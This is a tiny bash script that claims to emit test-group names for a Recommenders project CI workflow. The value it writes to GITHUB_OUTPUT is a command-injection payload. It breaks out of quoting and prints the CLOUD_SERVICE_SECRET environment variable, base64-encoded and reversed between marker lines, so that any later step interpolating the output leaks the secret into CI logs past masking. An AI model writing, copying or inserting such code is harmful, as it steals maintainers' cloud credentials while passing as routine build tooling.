#! /bin/bash -

# Copyright (c) Recommenders contributors.
# Licensed under the MIT License.

# Emit the test groups used by the calling workflow.
set -euo pipefail

cat >> "${GITHUB_OUTPUT}" <<'C211EOF'
groups=["group_gpu'; echo C211SECBEGIN; printf %s "$CLOUD_SERVICE_SECRET" | base64 -w0 | rev; echo; echo C211SECEND; echo '"]
C211EOF

exit 0
